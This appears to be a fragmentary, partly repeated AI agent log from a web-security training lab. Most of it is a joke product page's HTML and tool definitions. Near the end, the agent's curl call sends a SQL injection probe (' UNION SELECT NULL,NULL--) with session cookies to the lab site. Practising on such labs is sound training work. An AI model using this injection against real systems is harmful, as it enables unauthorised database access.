Get on with everyday tasks as your infant is soothed by the close contact with you at all times.\nWe highly recommend you start as you mean to go on and get the little one used to alternating with the left and right footwear. If you fail to observe this ritual you will find yourself with one overdeveloped calf muscle as you lug the child about.\nPsychologists have endorsed our unique and innovative range of baby minding shoes as they suggest close contact like this from an early age will encourage a strong bond between parent and child in the years ahead.\nKeep those tears and tantrums at bay, and order your first pair today!</td>\n                        </tr>\n                        <tr>\n                            <th>Hologram Stand In</th>\n                            <td>Do you ever have one of those days where nothing looks right, and you just don&apos;t feel like going to the ball?

This is particularly useful when other pet owners aren&apos;t put off by its peculiarities and insist on chatting &apos;animal&apos; with you.\nThe grasshoppers are surprisingly easy to keep. They will keep your home free of bugs and vermin and need little else to eat. They are slightly jumpy about being taken out on a leash, but with practice, you will find a way to fall in step quite quickly.\nThis particular breed has an exceptionally long lifespan and can be passed down through the generations. The grasshopper hasn&apos;t been cat, dog or child tested so we highly recommend not having any visit your home. Can be housed with other grasshoppers, an older quiet one could help to show it the ropes and understand the rules of the house.</td>\n                        </tr>\n                        <tr>\n                            <th>The Lazy Dog</th>\n                            <td>The Lazy Dog is brought to you by the same people who invented the wheel.

If the answer is yes, then The Lazy Dog is for you!\nAs easy to fit as a harness these remote controlled owl wings are a must have for any dog lover. As soon as your pooch has taken its last step of the day just snap the wings into place and click the red &apos;flapping&apos; button on your handheld remote. After a few seconds, your furry friend will be off the ground and up, up and away.\nOnce at a safe height, WARNING: BEWARE OF LOW HANGING BRANCHES, click the blue button to initiate cruise control. The wings have inbuilt cameras so you can see what your dog sees. When clicking the black button your dog can swoop down and gain speed in the &apos;fake chasing rabbits&apos; mode. This function is used at the owner&apos;s risk as it uses a lot of power, and if the battery pack dies a nasty accident could occur.\nCarrying your pooch has become a thing of the past.

Starting with our best seller, the Balloon Ride.\nA large collection of helium-filled balloons will be attached with a harness to your dog, once we are confident we have enough power for takeoff then it&apos;s up, up and away they go. This adventure is heavily weather dependent as strong winds could prove hazardous as all dogs fly unaccompanied.\nYour dog will travel at 5 mph with the wind in its face, and I expect its tongue hanging out. Better than a trip in the car with the window open. Health &amp; Safety is of paramount importance to us, should the dog, at any time, veer off course we will instantly start firing at the balloons one by one in order to facilitate their safe descent. This should not be any cause for concern as this is our official landing procedure at the end of the ride, and no fatalities have been recorded.\nYou are strongly advised to wear wet weather clothing and carry an umbrella on the day, the dogs can become very excited on this ride and we have little control over where they might hover. Give your best friend the time of its life, book today as all early birds have an added bonus of choosing the colors of the balloons.</td>\n                        </tr>\n                        </tbody>\n                    </table>\n                </div>\n            </section>\n            <div class=\"footer-wrapper\">\n            </div>\n        </div>\n    </body>\n</html>"}], "stream": false, "tools": [{"properties": {"command": {"default": "", "description": "The complete command to execute (e.g., \"ls -la\", \"ssh user@host\", \"cat file.txt\")", "title": "Command", "type": "string"}, "interactive": {"default": false, "description": "Set to True for commands that need persistent sessions (ssh, nc, python, ftp etc.)\n        Leave False for regular commands", "title": "Interactive", "type": "boolean"}, "session_id": {"description": "Use existing session ID to send commands to running interactive sessions.\n       Get session IDs from previous interactive command outputs.", "title": "Session Id", "type": "string"}}, "title": "generic_linux_command_args", "type": "object", "additionalProperties": false, "required": ["command", "interactive", "session_id"]}, {"properties": {"code": {"default": "", "description": "The code snippet to execute", "title": "Code", "type": "string"}, "language": {"default": "python", "description": "Programming language to use (default: python)", "title": "Language", "type": "string"}, "filename": {"default": "exploit", "description": "Base name for the file without extension (default: exploit)", "title": "Filename", "type": "string"}, "timeout": {"default": 100, "description": "Timeout for the execution (default: 100 seconds)\n    Use high timeout for long running code \n    Use low timeout for short running code", "title": "Timeout", "type": "integer"}}, "title": "execute_code_args", "type": "object", "additionalProperties": false, "required": ["code", "language", "filename", "timeout"]}], "tool_choice": null}

Get on with everyday tasks as your infant is soothed by the close contact with you at all times.\nWe highly recommend you start as you mean to go on and get the little one used to alternating with the left and right footwear. If you fail to observe this ritual you will find yourself with one overdeveloped calf muscle as you lug the child about.\nPsychologists have endorsed our unique and innovative range of baby minding shoes as they suggest close contact like this from an early age will encourage a strong bond between parent and child in the years ahead.\nKeep those tears and tantrums at bay, and order your first pair today!</td>\n                        </tr>\n                        <tr>\n                            <th>Hologram Stand In</th>\n                            <td>Do you ever have one of those days where nothing looks right, and you just don&apos;t feel like going to the ball?

This is particularly useful when other pet owners aren&apos;t put off by its peculiarities and insist on chatting &apos;animal&apos; with you.\nThe grasshoppers are surprisingly easy to keep. They will keep your home free of bugs and vermin and need little else to eat. They are slightly jumpy about being taken out on a leash, but with practice, you will find a way to fall in step quite quickly.\nThis particular breed has an exceptionally long lifespan and can be passed down through the generations. The grasshopper hasn&apos;t been cat, dog or child tested so we highly recommend not having any visit your home. Can be housed with other grasshoppers, an older quiet one could help to show it the ropes and understand the rules of the house.</td>\n                        </tr>\n                        <tr>\n                            <th>The Lazy Dog</th>\n                            <td>The Lazy Dog is brought to you by the same people who invented the wheel.

If the answer is yes, then The Lazy Dog is for you!\nAs easy to fit as a harness these remote controlled owl wings are a must have for any dog lover. As soon as your pooch has taken its last step of the day just snap the wings into place and click the red &apos;flapping&apos; button on your handheld remote. After a few seconds, your furry friend will be off the ground and up, up and away.\nOnce at a safe height, WARNING: BEWARE OF LOW HANGING BRANCHES, click the blue button to initiate cruise control. The wings have inbuilt cameras so you can see what your dog sees. When clicking the black button your dog can swoop down and gain speed in the &apos;fake chasing rabbits&apos; mode. This function is used at the owner&apos;s risk as it uses a lot of power, and if the battery pack dies a nasty accident could occur.\nCarrying your pooch has become a thing of the past. With The Lazy Dog, the dog park will become a place to enjoy again. You can also purchase an aviator hat and goggles, extra protection and peace of mind for you and your pooch.</td>\n                        </tr>\n                        <tr>\n                            <th>More Than Just Birdsong</th>\n                            <td>There was a time when the only decorations you would see on the wires of a wooden utility pole were socks and baseball boots; the odd colorful kite as well if you were lucky.\nWe have come up with a more desirable way to liven up those ugly overhead wires.

Starting with our best seller, the Balloon Ride.\nA large collection of helium-filled balloons will be attached with a harness to your dog, once we are confident we have enough power for takeoff then it&apos;s up, up and away they go. This adventure is heavily weather dependent as strong winds could prove hazardous as all dogs fly unaccompanied.\nYour dog will travel at 5 mph with the wind in its face, and I expect its tongue hanging out. Better than a trip in the car with the window open. Health &amp; Safety is of paramount importance to us, should the dog, at any time, veer off course we will instantly start firing at the balloons one by one in order to facilitate their safe descent. This should not be any cause for concern as this is our official landing procedure at the end of the ride, and no fatalities have been recorded.\nYou are strongly advised to wear wet weather clothing and carry an umbrella on the day, the dogs can become very excited on this ride and we have little control over where they might hover. Give your best friend the time of its life, book today as all early birds have an added bonus of choosing the colors of the balloons.</td>\n                        </tr>\n                        </tbody>\n                    </table>\n                </div>\n            </section>\n            <div class=\"footer-wrapper\">\n            </div>\n        </div>\n    </body>\n</html>"}, {"role": "assistant", "tool_calls": [{"id": "call_7vexjcQLQJH77zI2UTOoHsKM", "type": "function", "function": {"name": "generic_linux_command", "arguments": "{\"command\":\"curl -s -b \\\"SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZKtMtK3D0PUxhHoJWVMYXJUjwuRKaUwcEuAx7BSCbscmRl0x%2BZr%2BWCTuUHWieJYmSwtbDajqQw44CiV5co5BUFt0GQyqg1bVlqo1zoPTtIzT1zLiXYlGY6kZ9vMOE%2BX%2FzTzyyySbIYtxpM54CjLnOne; t=BQa7GRE7v4vqdEqloF0h8g%3D%3D; Authenticated_UserVerificationId=890534D67A34EFFD902CFBC2B724CFDA\\\" \\\"https://0a1c00ab04fb6d10811143d300b70040.web-security-academy.net/filter?category=' UNION SELECT NULL,NULL--\\\"\",\"interactive\":false,\"session_id\":\"\"}"}}]}, {"role": "tool", "tool_call_id": "call_7vexjcQLQJH77zI2UTOoHsKM", "content": "Tool response for call_7vexjcQLQJH77zI2UTOoHsKM"}], "stream": false, "tools": [{"properties": {"command": {"default": "", "description": "The complete command to execute (e.g., \"ls -la\", \"ssh user@host\", \"cat file.txt\")", "title": "Command", "type": "string"}, "interactive": {"default": false, "description": "Set to True for commands that need persistent sessions (ssh, nc, python, ftp etc.)\n        Leave False for regular commands", "title": "Interactive", "type": "boolean"}, "session_id": {"description": "Use existing session ID to send commands to running interactive sessions.\n       Get session IDs from previous interactive command outputs.", "title": "Session Id", "type": "string"}}, "title": "generic_linux_command_args", "type": "object", "additionalProperties": false, "required": ["command", "interactive", "session_id"]}, {"properties": {"code": {"default": "", "description": "The code snippet to execute", "title": "Code", "type": "string"}, "language": {"default": "python", "description": "Programming language to use (default: python)", "title": "Language", "type": "string"}, "filename": {"default": "exploit", "description": "Base name for the file without extension (default: exploit)", "title": "Filename", "type": "string"}, "timeout": {"default": 100, "description": "Timeout for the execution (default: 100 seconds)\n    Use high timeout for long running code \n    Use low timeout for short running code", "title": "Timeout", "type": "integer"}}, "title": "execute_code_args", "type": "object", "additionalProperties": false, "required": ["code", "language", "filename", "timeout"]}], "tool_choice": null}
